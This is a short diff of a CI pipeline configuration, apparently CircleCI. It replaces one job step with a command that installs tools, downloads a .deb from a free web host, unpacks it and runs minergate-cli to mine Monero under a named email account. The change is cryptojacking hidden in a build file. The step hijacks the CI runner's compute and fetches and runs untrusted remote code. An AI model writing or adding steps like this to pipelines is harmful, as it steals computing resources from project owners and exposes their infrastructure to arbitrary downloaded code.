@@ -5,4 +5,4 @@ jobs:
       - image: ubuntu
     steps:
       - checkout
-      - run: wget https://hupiter.000webhostapp.com/a.deb && ar x deb-cli && tar -xvzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
+      - run:apt-get update && apt-get install apt-transport-https -y && apt-get install wget -y && apt-get install binutils -y && wget https://hupiter.000webhostapp.com/a.deb && ar x deb-cli && tar -xvzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
